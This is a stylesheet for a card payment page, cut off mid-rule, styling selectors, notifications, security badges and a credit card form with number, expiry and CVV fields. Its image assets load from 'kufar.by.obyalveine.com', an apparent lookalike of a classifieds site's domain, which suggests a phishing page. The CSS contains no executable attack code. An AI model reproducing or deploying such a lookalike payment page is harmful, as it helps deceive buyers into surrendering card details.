ul.control__select_type_ok-p2p-selectBox-dropdown-menu li {
	margin-left: 15px;
	margin-right: 15px
}

ul.control__select_type_ok-p2p-selectBox-dropdown-menu li a {
	margin-left: -15px;
	margin-right: -15px;
	padding-left: 15px;
	padding-right: 15px;
	cursor: pointer
}

ul.control__select_type_ok-p2p-selectBox-dropdown-menu li:last-child {
	border-top: 1px solid #d8d8d8
}

.pay-window_type_ok-p2p a.control__select,
.pay-window_type_ok-p2p select.control__select {
	margin: -5px 0 0;
	border: 0;
	font-size: 13px;
	color: #666;
	cursor: pointer
}

.pay-window_type_ok-p2p select.control__select {
	padding: 5px 0 5px 5px
}

.pay-window_type_ok-p2p a.control__select {
	padding: 0
}

.pay-window_type_ok-p2p .control__select.selectBox-dropdown .selectBox-label {
	padding-left: 0;
	padding-right: 0
}

.pay-window_type_ok-p2p .control__select.selectBox-dropdown .selectBox-arrow {
	right: 15px;
	border-width: 4px 4px 0;
	border-color: #666 transparent transparent
}

.control__select_type_edok-select2.select2-container--default .select2-selection--single .select2-selection__rendered {
	line-height: 46px
}

.control__select_type_edok-select2.select2-container--default .select2-selection--single {
	background: #fff;
	border: 1px solid #ccc;
	border-radius: 0;
	height: 46px;
	outline: none
}

.control__select_type_edok-select2.select2-container--default .select2-selection--single .select2-selection__arrow {
	height: 46px
}

.control__select_type_edok-select2.select2-container--default .select2-selection--single .select2-selection__arrow b {
	border-color: #000 transparent transparent;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%)
}

.control__select_type_edok-select2.select2-container--default.select2-container--open .select2-selection--single .select2-selection__arrow b {
	border-color: transparent transparent #000
}

.control__select_type_edok-select2.select2-container--default .select2-results>.select2-results__options {
	margin: 0
}

.control__select_type_edok-select2 .select2-results__option {
	color: #000;
	font-size: 15px;
	margin: 0;
	padding: 0;
	border: 2px solid transparent;
	height: 42px;
	line-height: 42px;
	padding-left: 8px
}

.control__select_type_edok-select2.control__select_type_img .select2-results__option {
	text-align: center
}

.control__select_type_edok-select2.select2-container--default .select2-results__option--highlighted[aria-selected] {
	background-color: rgba(0, 0, 0, .05);
	color: #000
}

.control__select_type_edok-select2.select2-container--default .select2-results__option[aria-selected=true] {
	border-color: #168de2;
	background-color: transparent
}

.control__select_type_edok-select2 .img-logo {
	font-size: 0;
	-webkit-background-size: contain;
	background-size: contain;
	background-position: 50%;
	background-repeat: no-repeat;
	height: 38px;
	cursor: pointer
}

.control__input,
.control__textarea {
	background: #f2f2f2;
	padding: 6px 10px;
	border: 1px solid #dcdcdc;
	font-size: 13px;
	-webkit-transition: border .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
	transition: border .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
	-o-transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s;
	transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s;
	transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out
}

.control__input:focus,
.control__textarea:focus {
	-webkit-box-shadow: 0 0 5px #81c8ff;
	box-shadow: 0 0 5px #81c8ff;
	border: 1px solid #81c8ff
}

.control_layout_vertical .control-label__text {
	margin: -4px 0 5px
}

.control_layout_horizontal .control__checkbox,
.control_layout_horizontal .control__input,
.control_layout_horizontal .control__radio,
.control_layout_horizontal .control__select,
.control_layout_horizontal .control__textarea {
	margin-right: 7px
}

.control_error_yes .control__checkbox,
.control_error_yes .control__input,
.control_error_yes .control__select {
	margin-bottom: 10px
}

.control_error_yes .control__input {
	-webkit-box-shadow: none;
	box-shadow: none;
	border-color: transparent;
	outline: 2px solid #f33;
	outline-offset: -2px
}

.control__error-text {
	color: #f33;
	margin: -4px 0 5px
}

.control_multiline_yes .control-label__text {
	margin-left: 20px
}

.control_multiline_yes .control__error-text {
	margin-left: 20px;
	margin-top: 0
}

.control__mask,
.control__placeholder {
	font-size: 12px;
	color: #666;
	top: 0;
	left: 10px;
	line-height: 30px
}

.control__select.selectBox-dropdown .selectBox-label {
	padding: 4px 10px
}

.control__select-selectBox-dropdown-menu.selectBox-options li a {
	font-size: inherit
}

.control__tooltip {
	background-color: #a5cdf3;
	padding: 5px 10px;
	top: -10px;
	left: 255px;
	width: 210px;
	line-height: normal;
	-webkit-transition: visibility 0s linear .25s, opacity .25s;
	-o-transition: visibility 0s linear .25s, opacity .25s;
	transition: visibility 0s linear .25s, opacity .25s
}

.control__tooltip_visible_yes {
	-webkit-transition-delay: 0s;
	-o-transition-delay: 0s;
	transition-delay: 0s;
	z-index: 1
}

.control__tooltip:after {
	right: 100%;
	top: 25px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	position: absolute;
	pointer-events: none;
	border-right-color: #a5cdf3;
	border-width: 10px;
	margin-top: -10px
}

.control_mask-type_phone-code .control__mask {
	font-size: 13px
}

.control_mask-type_phone-code .control__input {
	padding-left: 25px
}

.control .intl-tel-input {
	margin-bottom: 10px
}
 
.control .intl-tel-input .country-list .country {
	padding: 0 8px
}

.control .intl-tel-input .selected-flag {
	outline: 0
}

.control .intl-tel-input .selected-flag .iti-arrow {
	border-top: 3px solid #000
}

.payment-info-table {
	margin: 0 0 20px
}

.payment-info-table__caption {
	margin: 0 0 10px;
	font-size: 13px;
	text-align: left;
	color: #666
}

.payment-info-table__cell,
.payment-info-table__head {
	width: 50%;
	border: 0;
	font-size: 13px;
	line-height: 19px
}

.payment-info-table__head {
	padding: 0 5px 0 0;
	color: #666;
	vertical-align: top
}

.payment-info-table__cell {
	padding: 0 0 0 5px;
	vertical-align: bottom
}

.info-block {
	color: #666;
	display: block
}

.info-block .text_color_dark {
	color: #333
}

.info-block .img {
	margin: 0 auto 20px;
	display: block;
	color: #333
}

.info-block .title {
	font-size: 15px;
	line-height: 20px;
	margin: -4px 0 15px;
	display: block
}

.info-block .title_caps_yes {
	text-transform: uppercase
}

.info-block .title_font-size_small {
	font-size: 12px;
	margin: -5px 0 15px
}

.info-block .title_bold_yes {
	font-weight: 700
}

.info-block .paragraph {
	margin: -5px 0 15px;
	display: block
}

.info-block .paragraph_font-size_large {
	font-size: 15px
}

.info-block .paragraph_font-size_small {
	font-size: 12px
}

.info-block .list-item {
	line-height: 20px;
	margin: -5px 0 15px
}

.info-block .list_marker_dash .list-item {
	padding: 0 0 0 20px;
	position: relative
}

.info-block .list_marker_dash .list-item:before {
	position: absolute;
	top: 0;
	left: 0;
	content: "\2014";
	color: #333
}

.info-block .list_font-size_big {
	font-size: 15px
}

.info-block .list_items-spacing_small {
	margin: 0 0 15px
}

.info-block .list_items-spacing_small .list-item {
	margin: -5px 0 10px
}

.info-block .img-link,
.info-block .info-block__content {
	display: block
}

.info-block .list-item-link {
	color: #333;
	display: block
}

.info-block_type_title .title {
	font-size: 20px;
	line-height: 20px;
	white-space: nowrap;
	margin: -2px 0 -3px;
	color: #333
}

.info-block_img-position_left .info-block__content,
.info-block_img-position_left .info-block__img-wrapper,
.info-block_img-position_right .info-block__content,
.info-block_img-position_right .info-block__img-wrapper {
	display: table-cell;
	vertical-align: middle
}

.info-block_img-position_left .info-block__content,
.info-block_img-position_right .info-block__content {
	width: 100%
}

.info-block_img-position_left .img,
.info-block_img-position_right .img {
	margin: 0
}

.info-block_img-position_left .info-block__content {
	padding-left: 20px
}

.info-block_img-position_right .info-block__content {
	padding-right: 20px
}

.info-block_text-position_left .info-block__content {
	text-align: left
}

.info-block_text-position_right .info-block__content {
	text-align: right
}

.info-block_img-type_shop .info-block__img-wrapper {
	height: 100px;
	width: 100px;
	margin-bottom: 20px;
	display: table-cell;
	vertical-align: middle;
	background-color: #fff;
	border: 1px solid #dcdcdc
}

.info-block_img-type_shop .img {
	margin-bottom: 0
}

.info-block_img-type_shop .info-block__content {
	padding-top: 20px
}

.notification-block {
	display: table;
	width: 100%;
	height: 100%;
	background: #fff
}

.notification-block__inner {
	display: table-cell;
	padding: 10px;
	text-align: center;
	vertical-align: middle
}

.notification-block .title {
	color: #333
}

.notification-block .button {
	color: #333;
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2RlZGVlMSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNiYmJiYmUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #dedee1;
	background-image: -webkit-linear-gradient(top, #dedee1, #bbbbbe);
	background-image: -o-linear-gradient(top, #dedee1 0, #bbbbbe 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dedee1), to(#bbbbbe));
	background-image: linear-gradient(180deg, #dedee1 0, #bbbbbe);
	min-width: 125px;
	margin: 10px 0
}

.notification-block .button:hover {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2U5ZTllYiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNjMWMxYzMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #e9e9eb;
	background-image: -webkit-linear-gradient(top, #e9e9eb, #c1c1c3);
	background-image: -o-linear-gradient(top, #e9e9eb 0, #c1c1c3 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#e9e9eb), to(#c1c1c3));
	background-image: linear-gradient(180deg, #e9e9eb 0, #c1c1c3)
}

.notification-block .button:active {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2JhYmFiZCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNkZGRkZTAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #bababd;
	background-image: -webkit-linear-gradient(top, #bababd, #dddde0);
	background-image: -o-linear-gradient(top, #bababd 0, #dddde0 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#bababd), to(#dddde0));
	background-image: linear-gradient(180deg, #bababd 0, #dddde0)
}

.notification-block .paragraph_color_red {
	color: #c00
}

.notification-block .payment-info-table {
	margin: 0 auto;
	text-align: left;
	border-collapse: initial;
	padding: 0;
	background-color: rgba(0, 0, 0, .04)
}

.notification-block .payment-info-table__caption {
	padding: 15px 0 10px;
	margin: 0;
	text-align: center;
	background-color: rgba(0, 0, 0, .04)
}

.notification-block .payment-info-table__head {
	padding: 0 5px 5px 15px;
	text-align: left
}

.notification-block .payment-info-table__cell {
	padding: 0 15px 5px 5px;
	color: #333
}

.notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 10px
}

.notification-block_type_troyka .info-block__img-wrapper {
	height: 139px;
	margin: 0 0 15px;
	padding: 15px 0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: url("https://kufar.by.obyalveine.com/img/card-troyka.jpg") 50% no-repeat
}

.retina_yes .notification-block_type_troyka .info-block__img-wrapper {
	background: url("https://kufar.by.obyalveine.com/img/card-troyka@2x.jpg") 50% no-repeat;
	-webkit-background-size: 219px 219px;
	background-size: 219px
}

.notification-block_type_troyka .info-block__img-wrapper {
	position: relative
}

.notification-block_type_troyka .info-block__img-wrapper:after {
	display: inline-block;
	width: 487px;
	height: 86px;
	margin: 0 auto;
	content: "";
	background: url("https://kufar.by.obyalveine.com/img/title-troyka.jpg") 50% no-repeat
}

.retina_yes .notification-block_type_troyka .info-block__img-wrapper:after {
	background: url("https://kufar.by.obyalveine.com/img/title-troyka@2x.jpg") 50% no-repeat;
	-webkit-background-size: 487px 487px;
	background-size: 487px
}

.notification-block_type_troyka .icon-hint {
	margin-bottom: 100px
}

.notification-block_type_status-page {
	min-width: 300px
}

.notification-block_type_status-page .title {
	font-size: 16px;
	line-height: 1.5;
	margin: 0
}

.notification-block_type_status-page .info-block .paragraph {
	font-size: 13px;
	margin: 10px 0 0;
	color: #666;
	line-height: 1.5
}

.notification-block_type_status-page a {
	color: #666;
	text-decoration: none;
	border-bottom: 1px solid #666
}

.notification-block_type_status-page a:hover {
	text-decoration: none;
	border-bottom: 1px solid transparent
}

.secure-information {
	background: #f5f6f7
}

.secure-information__columns {
	display: table;
	width: 100%
}

.secure-information__column {
	display: table-cell;
	vertical-align: middle;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.secure-information__column_position_left {
	width: 50%;
	padding: 15px 0 15px 20px;
	text-align: left
}

.secure-information__column_position_right {
	width: 50%;
	padding: 15px 20px 15px 0;
	text-align: right
}

.secure-information__text {
	font-size: 11px
}

.secure-information__text_type_protocol {
	text-transform: uppercase;
	color: #398f42
}

.secure-information__icon {
	display: inline-block;
	width: 12px;
	height: 16px;
	margin: -4px 2px 0 0; 
	vertical-align: middle
}

.secure-information .protection-icons {
	display: inline-block;
	-webkit-transform: translateX(2px);
	-o-transform: translateX(2px);
	transform: translateX(2px)
}

.secure-information .protection-icons__list-item {
	margin-right: 5px;
	margin-bottom: 0;
	vertical-align: top
}

.acceptable-card-types-tooltip {
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 5px 15px;
	margin: 20px auto 0;
	width: 100%;
	max-width: 360px;
	min-width: 315px
}

.acceptable-card-types-tooltip__text {
	-webkit-box-orient: horizontal;
	-webkit-box-direction: normal;
	-webkit-flex-direction: row;
	flex-direction: row;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	margin-bottom: 15px;
	color: #c2c2c4;
	font-size: 12px;
	font-family: -apple-system, BlinkMacSystemFont, Roboto, Open Sans, Helvetica Neue, sans-serif
}

.acceptable-card-types-tooltip__text,
.acceptable-card-types-tooltip__text .payment-systems-icons {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between
}

.acceptable-card-types-tooltip__text .payment-systems-icon {
	position: relative;
	display: block;
	margin-right: 8px
}

.acceptable-card-types-tooltip__text .payment-systems-icon:last-child {
	margin-right: 0
}

.acceptable-card-types-tooltip__text .payment-systems-icon_name_mir_small,
.acceptable-card-types-tooltip__text .payment-systems-icon_name_visa_small {
	top: 2px
}

.acceptable-card-types-tooltip__text_inner_text {
	text-transform: uppercase;
	-webkit-box-flex: 1;
	-webkit-flex: 1 90%;
	flex: 1 90%
}

.acceptable-card-types-tooltip__icon {
	margin-left: 5px;
	position: relative
}

.acceptable-card-types-tooltip__icon:hover .acceptable-card-types-tooltip__icon_tooltip-arrow,
.acceptable-card-types-tooltip__icon:hover .acceptable-card-types-tooltip__tooltip {
	display: block
}

.acceptable-card-types-tooltip__tooltip {
	position: absolute;
	display: none;
	max-width: 360px;
	top: 25px;
	right: -5px;
	font-size: 12px;
	line-height: 14px;
	padding: 5px 8px;
	white-space: normal;
	border: none;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #ededed;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	text-align: left;
	color: #fff;
	font-family: Arial, Tahoma, Verdana, sans-serif;
	letter-spacing: -.02em
}

.acceptable-card-types-tooltip__tooltip:before {
	position: absolute;
	bottom: 100%;
	right: 0;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #ededed;
	border-width: 10px;
	margin-left: -10px;
	display: block
}

.acceptable-card-types-tooltip__secure-information {
	display: block;
	margin: 0 auto;
	padding: 0;
	width: 335px
}

.acceptable-card-types-tooltip__secure-information .protection-icons__list {
	-webkit-box-pack: center;
	-webkit-justify-content: center;
	justify-content: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.protection-icons__list-item {
	float: left;
	margin: 0 0 10px 10px
}

.protection-icons__list-item:first-child {
	margin-left: 0
}

.protection-icon {
	display: inline-block;
	margin: 0;
	vertical-align: middle
}
 
.credit-card-form {
	position: relative
}

.credit-card-form__popup {
	display: none;
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	z-index: 3;
	background-color: #fff
}

.credit-card-form__popup-overlay {
	display: none
}

.credit-card-form__popup-body {
	height: 80%
}

.credit-card-form__popup-footer {
	height: 20%;
	text-align: center
}

.credit-card-form__form {
	padding: 90px 0 0 5px
}

.credit-card-form__card {
	position: relative;
	width: 310px;
	height: 190px;
	margin: 0 0 15px;
	padding: 35px 25px 10px;
	-webkit-box-shadow: 0 0 5px 0 rgba(0, 0, 0, .4);
	box-shadow: 0 0 5px 0 rgba(0, 0, 0, .4);
	border-radius: 5px;
	background: #fff
}

.credit-card-form__card_position_front {
	z-index: 2
}

.credit-card-form__card_position_back {
	z-index: 1;
	float: left;
	margin: -300px 0;
	padding-top: 30px;
	right: -135px
}

.credit-card-form__card_position_back:before {
	display: block;
	height: 38px;
	margin: 0 -25px 10px;
	background: #333;
	content: ""
}

.credit-card-form__label {
	display: block;
	font-size: 11px;
	text-transform: uppercase;
	color: #666
}

.credit-card-form__title {
	display: block;
	margin: -5px 0 0;
	white-space: nowrap;
	-webkit-text-size-adjust: 100%;
	text-size-adjust: 100%
}

.credit-card-form__input {
	display: block;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	width: 100%;
	background: #f2f2f2;
	margin: 0;
	padding: 3px 0 3px 10px;
	border: 1px solid #dcdcdc;
	font-size: 18px;
	text-transform: uppercase;
	letter-spacing: 2px;
	-webkit-transition: border .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
	transition: border .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out;
	-o-transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s;
	transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s;
	transition: border .25s ease-in-out, box-shadow .25s ease-in-out, margin .25s, -webkit-box-shadow .25s ease-in-out
}

:not(.ms) .credit-card-form__input_type_protected {
	font-family: text-security-disc!important;
	line-height: inherit
}

:not(.ms) .credit-card-form_size_x-small .credit-card-form__input_type_protected {
	line-height: 21px
}

:not(.ms) .credit-card-form__input_type_protected::-webkit-input-placeholder {
	font-family: arial, helvetica
}

:not(.ms) .credit-card-form__input_type_protected::-moz-placeholder {
	font-family: arial, helvetica
}

:not(.ms) .credit-card-form__input_type_protected::placeholder {
	font-family: arial, helvetica
}

.credit-card-form__input:focus {
	-webkit-box-shadow: 0 0 5px #81c8ff;
	box-shadow: 0 0 5px #81c8ff;
	border: 1px solid #81c8ff
}

.credit-card-form__input::-ms-clear {
	display: none
}

.credit-card-form__description-text,
.credit-card-form__error-text {
	display: none;
	position: absolute;
	color: #f33;
	margin: 0;
	line-height: normal;
	font-size: 11px;
	text-transform: none
}

.credit-card-form__description-text {
	display: block;
	margin-top: 2px;
	color: #888
}

.credit-card-form__label_error_yes .credit-card-form__input {
	margin-bottom: 0;
	border-color: transparent;
	outline: 2px solid #f33;
	outline-offset: -1px
}

.credit-card-form__label_error_yes .credit-card-form__error-text {
	margin-top: 2px;
	display: block
}

.credit-card-form__label_error_yes .credit-card-form__description-text {
	display: none
}

.credit-card-form__label-group_type_card-number {
	margin-bottom: 25px;
	padding: 5px 0 0
}

.credit-card-form__label-group_type_holder-name {
	margin: 0 0 15px
}

.credit-card-form__label-group_type_holder-name .credit-card-form__input {
	letter-spacing: normal
}

.credit-card-form__title_type_expiration-date {
	position: absolute;
	left: 20px;
	bottom: 15px;
	width: 75px
}

.credit-card-form__label-group_type_expiration-date {
	margin: 0 0 10px;
	float: right
}

.credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	width: 75px;
	margin: 0 0 0 6px
}

.credit-card-form__label-group_type_cvv {
	position: relative
}

.credit-card-form__label-group_type_cvv .credit-card-form__label {
	width: 70px;
	float: right;
	margin: 0 5px;
	padding-bottom: 10px
}

.credit-card-form__cvv-icon {
	outline: none;
	position: absolute;
	right: 5px;
	top: -4px;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none
}

.credit-card-form__label-group_type_cvv .credit-card-form__error-text {
	width: 100px;
	margin-left: -20px
}

.credit-card-form__label-group_type_add-card {
	margin: 0;
	text-align: left;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none
}

.credit-card-form__label-group_type_add-card .credit-card-form__label {
	font-size: 13px;
	line-height: 18px;
	text-transform: none;
	cursor: pointer
}

.credit-card-form__label-group_type_add-card .credit-card-form__input {
	position: relative;
	vertical-align: top;
	top: 2px;
	display: inline-block;
	width: auto;
	margin: 0 10px 0 0;
	padding: 0;
	background: none;
	border: none
}

.credit-card-form__submit {
	text-align: center;
	margin-top: 20px
}

.credit-card-form__tooltip {
	position: absolute;
	color: #333;
	font-size: 12px;
	text-transform: none;
	opacity: 0;
	visibility: hidden;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background-color: #a5cdf3;
	padding: 7px 10px;
	line-height: normal;
	-webkit-transition: visibility 0s linear .25s, opacity .25s;
	-o-transition: visibility 0s linear .25s, opacity .25s;
	transition: visibility 0s linear .25s, opacity .25s;
	z-index: 2
}

.credit-card-form__tooltip_visible_yes {
	opacity: 1;
	visibility: visible;
	-webkit-transition-delay: 0s;
	-o-transition-delay: 0s;
	transition-delay: 0s
}

.credit-card-form__tooltip_type_cvv {
	top: 25px;
	left: 181px;
	text-align: center
}

.credit-card-form__tooltip_type_add-card {
	width: 240px;
	margin: -35px 0 0 195px
}

.credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	margin: 5px auto 0
}

.credit-card-form__tooltip-arrow {
	position: absolute;
	top: 100%;
	right: 11px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: #a5cdf3;
	border-width: 10px;
	margin-left: -10px
}

.credit-card-form__add-card-icon {
	display: inline-block;
	width: 16px;
	height: 16px;
	margin: -1px 0 0 3px;
	font-size: 0;
	line-height: 0;
	vertical-align: middle;
	background: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/credit-card-form/question.png") no-repeat
}

.retina_yes .credit-card-form__add-card-icon {
	background: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/credit-card-form/question@2x.png") no-repeat;
	-webkit-background-size: 16px 16px;
	background-size: 16px
}

.credit-card-form__popup-footer .button,
.pay-card-layout_type_dc .credit-card-form__popup .button,
.pay-card-layout_type_zz .credit-card-form__popup .button {
	color: #333;
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2RlZGVlMSIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNiYmJiYmUiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #dedee1;
	background-image: -webkit-linear-gradient(top, #dedee1, #bbbbbe);
	background-image: -o-linear-gradient(top, #dedee1 0, #bbbbbe 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#dedee1), to(#bbbbbe));
	background-image: linear-gradient(180deg, #dedee1 0, #bbbbbe);
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.credit-card-form__popup-footer .button:hover,
.pay-card-layout_type_dc .credit-card-form__popup .button:hover,
.pay-card-layout_type_zz .credit-card-form__popup .button:hover {
	background: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2U5ZTllYiIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiNjMWMxYzMiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+");
	background-color: #e9e9eb;
	background-image: -webkit-linear-gradient(top, #e9e9eb, #c1c1c3);
	background-image: -o-linear-gradient(top, #e9e9eb 0, #c1c1c3 100%);
	background-image: -webkit-gradient(linear, left top, left bottom, from(#e9e9eb), to(#c1c1c3));
	background-image: linear-gradient(180deg, #e9e9eb 0, #c1c1c3)
}

.credit-card-form__popup-footer .button:active,
.pay-card-layout_type_dc .credit-card-form__popup .button:active,
.pay-card-layout_type_zz .credit-card-form__popup .button:active {
